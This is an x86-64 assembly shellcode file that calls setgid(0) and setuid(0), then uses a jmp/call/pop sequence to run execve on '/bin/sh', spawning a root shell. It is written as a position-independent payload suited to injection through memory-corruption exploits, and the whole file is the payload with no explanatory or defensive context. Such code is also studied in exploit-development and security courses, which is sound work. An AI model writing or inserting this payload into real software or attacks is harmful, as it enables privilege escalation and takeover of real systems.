.globl _start
_start:
        /* setgid(0) */
        xorq %rdi,%rdi
        movq %rdi,%rax
        movb $106,%al
	syscall
        /* setuid(0) */
        xorq %rdi,%rdi
        movq %rdi,%rax
        movb $105,%al
	syscall
        jmp getstring
rtn:
        pop %rdi
        xorq %rdx,%rdx
        movq %rdx,%rax
        push %rdx
        push %rdi
        movq %rsp,%rsi
        movb $59, %al
	syscall
getstring: call rtn
        .string "/bin/sh"
